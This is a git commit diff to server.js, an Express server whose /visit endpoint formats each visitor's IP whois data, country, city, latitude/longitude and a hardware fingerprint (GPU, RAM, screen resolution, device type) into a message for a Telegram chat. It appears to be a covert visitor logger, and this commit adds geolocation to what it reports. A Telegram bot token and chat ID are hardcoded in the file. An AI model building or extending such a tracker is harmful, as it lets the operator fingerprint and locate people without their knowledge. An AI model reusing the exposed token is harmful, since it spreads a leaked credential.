e3459db73b3d90a59c23918728776eb9a7af92ae
|  ᴷᵃʳᵉᵉᵐ ᴬᵇᵈᵉˡᵐᵘᵗᵗᵃˡᶦᵇ <kareem.abdelmuttalib.eg@gmail.com>
2025-12-23 20:03:34 +0200

    Update server.js

--- server.js
+++ server.js
@@ -1,10 +1,7 @@
 const express = require("express");
 const path = require("path");
 const app = express();
-
 app.use(express.json());
-// هذا السطر هو المسؤول عن إظهار الصور الموجودة في المجلد
-app.use(express.static(__dirname)); 
 
 const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
 const TELEGRAM_CHAT_ID = "8059402181";
@@ -16,8 +13,7 @@ async function getWhois(ip) {
     return {
       org: data.entities?.[0]?.vcardArray?.[1]?.find(v => v[0] === "fn")?.[3] || "N/A",
       cidr: data.cidr0_cidrs?.[0]?.v4prefix + "/" + data.cidr0_cidrs?.[0]?.length,
-      handle: `${data.startAddress} - ${data.endAddress}`,
-      network: data.name
+      handle: `${data.startAddress} - ${data.endAddress}`
     };
   } catch(e) { return null; }
 }
@@ -45,11 +41,15 @@ app.post("/visit", async (req, res) => {
 • <b>CIDR:</b> ${whois?.cidr || "N/A"}
 • <b>Handle:</b> ${whois?.handle || "N/A"}
 
-<b>💻 HARDWARE</b>
+<b>📍 GEOGRAPHICAL INFO</b>
+• <b>Country:</b> ${geo.country}
+• <b>City:</b> ${geo.city}
+• <b>Lat/Lon:</b> ${geo.lat}, ${geo.lon}
+
+<b>💻 HARDWARE FINGERPRINT</b>
 • <b>GPU:</b> <code>${client.gpu || "N/A"}</code>
-• <b>RAM:</b> ~${client.ram || "N/A"} GB
-• <b>Cores:</b> ${client.cores || "N/A"}
-• <b>Resolution:</b> ${client.res || "N/A"}
+• <b>RAM:</b> ~${client.hw?.ram} GB
+• <b>Resolution:</b> ${client.scr}
 
 <b>📱 DEVICE</b>
 • <b>Type:</b> ${/mobile/i.test(ua) ? "Mobile" : "Desktop"}
